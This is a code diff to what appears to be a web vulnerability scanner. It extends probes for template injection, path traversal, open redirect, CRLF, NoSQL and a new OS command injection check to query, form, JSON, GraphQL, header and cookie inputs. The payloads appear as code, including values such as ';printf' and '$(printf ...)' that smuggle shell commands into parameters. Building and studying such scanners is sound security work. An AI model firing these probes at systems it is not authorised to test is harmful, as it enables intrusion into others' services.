@@ -20,6 +20,7 @@ directly; the ``run_*`` drivers just wire them to real requests per parameter.
 from __future__ import annotations
 
 import logging
+import json
 import random
 import re
 from difflib import SequenceMatcher
@@ -61,6 +62,157 @@ def _with_param(url: str, param: str, value: str) -> str:
     q = dict(parse_qsl(parts.query, keep_blank_values=True))
     q[param] = value
     return urlunparse(parts._replace(query=urlencode(q)))
+
+
+def _headers(headers_json: str | Dict[str, str] | None) -> Dict[str, str]:
+    if isinstance(headers_json, dict):
+        return {str(k): str(v) for k, v in headers_json.items()}
+    try:
+        parsed = json.loads(headers_json or "{}")
+    except (TypeError, json.JSONDecodeError):
+        parsed = {}
+    return {str(k): str(v) for k, v in parsed.items()} if isinstance(parsed, dict) else {}
+
+
+def _content_type(headers: Dict[str, str]) -> str:
+    return next(
+        (str(v).lower() for k, v in headers.items() if str(k).lower() == "content-type"),
+        "",
+    )
+
+
+def _json_paths(value: Any, prefix: str = "") -> List[str]:
+    paths: List[str] = []
+    if isinstance(value, dict):
+        for key, child in value.items():
+            path = f"{prefix}.{key}" if prefix else str(key)
+            if isinstance(child, (dict, list)):
+                paths.extend(_json_paths(child, path))
+            else:
+                paths.append(path)
+    return paths
+
+
+def _set_json_path(value: Dict[str, Any], path: str, replacement: Any) -> bool:
+    parts = [part for part in path.split(".") if part]
+    current: Any = value
+    for part in parts[:-1]:
+        if not isinstance(current, dict) or part not in current:
+            return False
+        current = current[part]
+    if not parts or not isinstance(current, dict) or parts[-1] not in current:
+        return False
+    current[parts[-1]] = replacement
+    return True
+
+
+def _parameter_specs(
+    target_url: str,
+    params: str,
+    method: str,
+    headers: Dict[str, str],
+    body: str,
+) -> List[str]:
+    explicit = [p.strip() for p in params.split(",") if p.strip()]
+    if explicit:
+        return explicit
+    query = [f"query:{p}" for p in _params_of(target_url)]
+    if query:
+        return query
+    ctype = _content_type(headers)
+    if "json" in ctype or (body or "").lstrip().startswith("{"):
+        try:
+            parsed = json.loads(body or "{}")
+        except json.JSONDecodeError:
+            parsed = {}
+        if isinstance(parsed, dict):
+            return [f"json:{path}" for path in _json_paths(parsed)]
+    if method.upper() != "GET" and body:
+        return [f"form:{key}" for key, _ in parse_qsl(body, keep_blank_values=True)]
+    return []
+
+
+def _split_spec(spec: str, method: str, headers: Dict[str, str], body: str) -> Tuple[str, str]:
+    if ":" in spec and spec.split(":", 1)[0] in {
+        "query", "form", "json", "graphql", "header", "cookie"
+    }:
+        return tuple(spec.split(":", 1))  # type: ignore[return-value]
+    if method.upper() == "GET":
+        return "query", spec
+    if "json" in _content_type(headers) or (body or "").lstrip().startswith("{"):
+        return "json", spec
+    return "form", spec
+
+
+def _mutate_request(
+    target_url: str,
+    method: str,
+    headers: Dict[str, str],
+    body: str,
+    spec: str,
+    replacement: Any,
+    *,
+    key_suffix: str = "",
+) -> Tuple[str, str, Dict[str, str], str, str]:
+    """Mutate one request input while preserving every other request field."""
+    location, name = _split_spec(spec, method, headers, body)
+    out_headers = dict(headers)
+    out_url, out_body = target_url, body or ""
+    if location == "query":
+        out_url = _with_param(target_url, name + key_suffix, str(replacement))
+    elif location == "form":
+        pairs = parse_qsl(out_body, keep_blank_values=True)
+        updated = False
+        mutated = []
+        for key, value in pairs:
+            if key == name:
+                mutated.append((key + key_suffix, str(replacement)))
+                updated = True
+            else:
+                mutated.append((key, value))
+        if not updated:
+            mutated.append((name + key_suffix, str(replacement)))
+        out_body = urlencode(mutated)
+        if not _content_type(out_headers):
+            out_headers["Content-Type"] = "application/x-www-form-urlencoded"
+    elif location == "json":
+        try:
+            document = json.loads(out_body or "{}")
+        except json.JSONDecodeError:
+            document = {}
+        if not isinstance(document, dict):
+            document = {}
+        _set_json_path(document, name, replacement)
+        out_body = json.dumps(document, separators=(",", ":"))
+        out_headers["Content-Type"] = "application/json"
+    elif location == "graphql":
+        try:
+            document = json.loads(out_body or "{}")
+        except json.JSONDecodeError:
+            document = {}
+        query = str(document.get("query") or "") if isinstance(document, dict) else ""
+        query = re.sub(
+            rf"({re.escape(name)}\s*:\s*)([\"'])(.*?)(\2)",
+            lambda match: match.group(1) + match.group(2) + str(replacement) + match.group(2),
+            query,
+            count=1,
+        )
+        if isinstance(document, dict):
+            document["query"] = query
+        out_body = json.dumps(document, separators=(",", ":"))
+        out_headers["Content-Type"] = "application/json"
+    elif location == "header":
+        out_headers[name] = str(replacement)
+    elif location == "cookie":
+        cookie_key = next((key for key in out_headers if key.lower() == "cookie"), "Cookie")
+        cookies = dict(
+            pair.strip().split("=", 1)
+            for pair in out_headers.get(cookie_key, "").split(";")
+            if "=" in pair
+        )
+        cookies[name] = str(replacement)
+        out_headers[cookie_key] = "; ".join(f"{k}={v}" for k, v in cookies.items())
+    return method.upper(), out_url, out_headers, out_body, location
 
 
 def _headers_lower(resp: Dict[str, Any]) -> Dict[str, str]:
@@ -135,30 +287,36 @@ def _crlf_hit(resp: Dict[str, Any], marker_header: str, marker_value: str) -> bo
 _SSTI_TEMPLATES = ["{{{0}}}", "${{{0}}}", "#{{{0}}}", "${0}", "#{0}", "<%= {0} %>"]
 
 
-def run_probe_ssti(target_url: str, params: str = "", fetch: Optional[HttpFetch] = None,
+def run_probe_ssti(target_url: str, params: str = "", method: str = "GET",
+                   headers_json: str | Dict[str, str] = "{}", body: str = "",
+                   fetch: Optional[HttpFetch] = None,
                    rng: Optional[random.Random] = None) -> Dict[str, Any]:
     http = fetch or _default_http
     r = rng or random.Random()
     a, b = r.choice([1009, 1013, 1019]), r.choice([1021, 1031, 1033])
     product = a * b
     expr = f"{a}*{b}"
-    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
     candidates: List[Dict[str, Any]] = []
     if not param_list:
         return {"probe": "ssti", "target": target_url, "candidates": [],
-                "note": "no query parameters to test; pass params=…"}
+                "note": "no request parameters to test; pass typed params such as query:q or json:name"}
     for param in param_list:
         for tmpl in _SSTI_TEMPLATES:
             payload = tmpl.format(expr)
-            url = _with_param(target_url, param, payload)
-            resp = http("GET", url, {}, "")
+            req_method, url, req_headers, req_body, location = _mutate_request(
+                target_url, method, request_headers, body, param, payload
+            )
+            resp = http(req_method, url, req_headers, req_body)
             if resp.get("error"):
                 continue
             if _ssti_hit(resp.get("body") or "", product, f"{a}{b}"):
                 candidates.append({
                     "title": f"Server-Side Template Injection in '{param}'",
                     "vuln_type": "ssti", "severity": "high", "url": url,
-                    "param": param, "payload": payload,
+                    "param": param, "location": location, "method": req_method,
+                    "payload": payload, "request_body": req_body,
                     "evidence": f"{expr} evaluated to {product} in the response",
                     "confirmed": True,
                 })
@@ -175,18 +333,22 @@ _TRAVERSAL_PAYLOADS = [
 ]
 
 
-def run_probe_path_traversal(target_url: str, params: str = "",
+def run_probe_path_traversal(target_url: str, params: str = "", method: str = "GET",
+                             headers_json: str | Dict[str, str] = "{}", body: str = "",
                              fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
     http = fetch or _default_http
-    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
     candidates: List[Dict[str, Any]] = []
     if not param_list:
         return {"probe": "path_traversal", "target": target_url, "candidates": [],
-                "note": "no query parameters to test; pass params=… (e.g. file,path,template)"}
+                "note": "no request parameters to test; pass params=… (e.g. form:file,json:path)"}
     for param in param_list:
         for payload in _TRAVERSAL_PAYLOADS:
-            url = _with_param(target_url, param, payload)
-            resp = http("GET", url, {}, "")
+            req_method, url, req_headers, req_body, location = _mutate_request(
+                target_url, method, request_headers, body, param, payload
+            )
+            resp = http(req_method, url, req_headers, req_body)
             if resp.get("error"):
                 continue
             label = _traversal_hit(resp.get("body") or "")
@@ -194,7 +356,8 @@ def run_probe_path_traversal(target_url: str, params: str = "",
                 candidates.append({
                     "title": f"Path Traversal in '{param}'",
                     "vuln_type": "path_traversal", "severity": "high", "url": url,
-                    "param": param, "payload": payload,
+                    "param": param, "location": location, "method": req_method,
+                    "payload": payload, "request_body": req_body,
                     "evidence": f"leaked file signature: {label}", "confirmed": True,
                 })
                 break
@@ -212,19 +375,23 @@ _REDIRECT_PAYLOADS = [
 ]
 
 
-def run_probe_open_redirect(target_url: str, params: str = "",
+def run_probe_open_redirect(target_url: str, params: str = "", method: str = "GET",
+                            headers_json: str | Dict[str, str] = "{}", body: str = "",
                             fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
     http = fetch or _default_http
     hint = ("next", "url", "redirect", "return", "returnUrl", "dest", "destination",
             "continue", "r", "u", "to")
-    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
     if not param_list:
-        param_list = list(hint)  # try common redirect param names against the URL
+        param_list = [f"query:{name}" for name in hint]
     candidates: List[Dict[str, Any]] = []
     for param in param_list:
         for payload in _REDIRECT_PAYLOADS:
-            url = _with_param(target_url, param, payload)
-            resp = http("GET", url, {}, "")
+            req_method, url, req_headers, req_body, location = _mutate_request(
+                target_url, method, request_headers, body, param, payload
+            )
+            resp = http(req_method, url, req_headers, req_body)
             if resp.get("error"):
                 continue
             why = _open_redirect_hit(resp, _REDIRECT_MARKER)
@@ -232,14 +399,17 @@ def run_probe_open_redirect(target_url: str, params: str = "",
                 candidates.append({
                     "title": f"Open Redirect via '{param}'",
                     "vuln_type": "open_redirect", "severity": "medium", "url": url,
-                    "param": param, "payload": payload, "evidence": why, "confirmed": True,
+                    "param": param, "location": location, "method": req_method,
+                    "payload": payload, "request_body": req_body,
+                    "evidence": why, "confirmed": True,
                 })
                 break
     return {"probe": "open_redirect", "target": target_url,
             "tested_params": param_list, "candidates": candidates}
 
 
-def run_probe_crlf(target_url: str, params: str = "",
+def run_probe_crlf(target_url: str, params: str = "", method: str = "GET",
+                   headers_json: str | Dict[str, str] = "{}", body: str = "",
                    fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
     http = fetch or _default_http
     marker_hdr, marker_val = "X-Aeg-Inj", "crlf" + "1337"
@@ -249,22 +419,26 @@ def run_probe_crlf(target_url: str, params: str = "",
         f"\r\n{marker_hdr}: {marker_val}",
         f"%E5%98%8D%E5%98%8A{marker_hdr}:%20{marker_val}",  # unicode CRLF
     ]
-    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
     candidates: List[Dict[str, Any]] = []
     if not param_list:
         return {"probe": "crlf", "target": target_url, "candidates": [],
-                "note": "no query parameters to test; pass params=…"}
+                "note": "no request parameters to test; pass typed params such as query:q or form:name"}
     for param in param_list:
         for payload in injections:
-            url = _with_param(target_url, param, payload)
-            resp = http("GET", url, {}, "")
+            req_method, url, req_headers, req_body, location = _mutate_request(
+                target_url, method, request_headers, body, param, payload
+            )
+            resp = http(req_method, url, req_headers, req_body)
             if resp.get("error"):
                 continue
             if _crlf_hit(resp, marker_hdr, marker_val):
                 candidates.append({
                     "title": f"CRLF / HTTP Response Header Injection in '{param}'",
                     "vuln_type": "crlf", "severity": "medium", "url": url,
-                    "param": param, "payload": payload,
+                    "param": param, "location": location, "method": req_method,
+                    "payload": payload, "request_body": req_body,
                     "evidence": f"injected header {marker_hdr}: {marker_val} reflected",
                     "confirmed": True,
                 })
@@ -298,38 +472,120 @@ _NOSQL_PAIRS = [
 ]
 
 
-def run_probe_nosql(target_url: str, params: str = "",
+def run_probe_nosql(target_url: str, params: str = "", method: str = "GET",
+                    headers_json: str | Dict[str, str] = "{}", body: str = "",
                     fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
     """Boolean-differential NoSQL (Mongo-style operator) injection probe."""
     http = fetch or _default_http
-    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
     if not param_list:
         return {"probe": "nosql", "target": target_url, "candidates": [],
-                "note": "no query parameters to test; pass params=…"}
+                "note": "no request parameters to test; pass typed params such as form:user or json:user"}
     candidates: List[Dict[str, Any]] = []
     for param in param_list:
-        base = http("GET", _with_param(target_url, param, "aegbase"), {}, "")
+        base_req = _mutate_request(
+            target_url, method, request_headers, body, param, "aegbase"
+        )
+        base = http(base_req[0], base_req[1], base_req[2], base_req[3])
         for true_p, false_p in _NOSQL_PAIRS:
             # operator payloads mutate the param KEY (param[$ne]=…); string ones the value
-            if true_p.startswith("["):
-                t_url = _with_param(target_url, f"{param}{true_p.split('=')[0]}", true_p.split('=', 1)[1])
-                f_url = _with_param(target_url, f"{param}{false_p.split('=')[0]}", false_p.split('=', 1)[1])
+            location, _ = _split_spec(param, method, request_headers, body)
+            if true_p.startswith("[") and location == "json":
+                t_req = _mutate_request(
+                    target_url, method, request_headers, body, param,
+                    {true_p[1:true_p.index("]")]: true_p.split("=", 1)[1]},
+                )
+                f_req = _mutate_request(
+                    target_url, method, request_headers, body, param,
+                    {false_p[1:false_p.index("]")]: false_p.split("=", 1)[1]},
+                )
+            elif true_p.startswith("["):
+                t_req = _mutate_request(
+                    target_url, method, request_headers, body, param,
+                    true_p.split("=", 1)[1], key_suffix=true_p.split("=", 1)[0],
+                )
+                f_req = _mutate_request(
+                    target_url, method, request_headers, body, param,
+                    false_p.split("=", 1)[1], key_suffix=false_p.split("=", 1)[0],
+                )
             else:
-                t_url = _with_param(target_url, param, true_p)
-                f_url = _with_param(target_url, param, false_p)
-            t = http("GET", t_url, {}, "")
-            f = http("GET", f_url, {}, "")
+                t_req = _mutate_request(target_url, method, request_headers, body, param, true_p)
+                f_req = _mutate_request(target_url, method, request_headers, body, param, false_p)
+            t = http(t_req[0], t_req[1], t_req[2], t_req[3])
+            f = http(f_req[0], f_req[1], f_req[2], f_req[3])
             if _bool_diff_hit(base, t, f):
                 candidates.append({
                     "title": f"NoSQL injection (boolean-differential) in '{param}'",
-                    "vuln_type": "nosql", "severity": "high", "url": t_url,
-                    "param": param, "payload": true_p,
+                    "vuln_type": "nosql", "severity": "high", "url": t_req[1],
+                    "param": param, "location": location, "method": t_req[0],
+                    "payload": true_p, "request_body": t_req[3],
                     "evidence": "true/false operator payloads produced a boolean-"
                                 "differential response", "confirmed": True,
                 })
                 break
     return {"probe": "nosql", "target": target_url,
             "tested_params": param_list, "candidates": candidates}
+
+
+# ---------------------------------------------------------------------------
+# OS command injection (response marker; non-destructive)
+# ---------------------------------------------------------------------------
+
+def run_probe_command_injection(
+    target_url: str,
+    params: str = "",
+    method: str = "GET",
+    headers_json: str | Dict[str, str] = "{}",
+    body: str = "",
+    fetch: Optional[HttpFetch] = None,
+    rng: Optional[random.Random] = None,
+) -> Dict[str, Any]:
+    """Confirm command execution by printing a unique inert response marker."""
+    http = fetch or _default_http
+    marker = "AEGCMD" + str((rng or random.Random()).randint(100000, 999999))
+    request_headers = _headers(headers_json)
+    param_list = _parameter_specs(target_url, params, method, request_headers, body)
+    if not param_list:
+        return {
+            "probe": "command_injection", "target": target_url, "candidates": [],
+            "note": "no request parameters to test; pass typed params such as form:host or json:command",
+        }
+    payloads = [
+        f";printf {marker}",
+        f"|printf {marker}",
+        f"$(printf {marker})",
+        f"& echo {marker}",
+    ]
+    candidates: List[Dict[str, Any]] = []
+    baseline = http(method.upper(), target_url, request_headers, body or "")
+    baseline_body = baseline.get("body") or ""
+    for param in param_list:
+        for payload in payloads:
+            req_method, url, req_headers, req_body, location = _mutate_request(
+                target_url, method, request_headers, body, param, payload
+            )
+            response = http(req_method, url, req_headers, req_body)
+            response_body = response.get("body") or ""
+            if not response.get("error") and marker in response_body and marker not in baseline_body:
+                candidates.append({
+                    "title": f"OS Command Injection in '{param}'",
+                    "vuln_type": "command_injection",
+                    "severity": "critical",
+                    "url": url,
+                    "param": param,
+                    "location": location,
+                    "method": req_method,
+                    "payload": payload,
+                    "request_body": req_body,
+                    "evidence": f"server response contained command output marker {marker}",
+                    "confirmed": True,
+                })
+                break
+    return {
+        "probe": "command_injection", "target": target_url,
+        "tested_params": param_list, "candidates": candidates,
+    }
 
 
 # ---------------------------------------------------------------------------
@@ -443,6 +699,7 @@ __all__ = [
     "run_probe_open_redirect",
     "run_probe_crlf",
     "run_probe_nosql",
+    "run_probe_command_injection",
     "run_probe_prototype_pollution",
     "run_probe_stored_xss",
     "_ssti_hit",
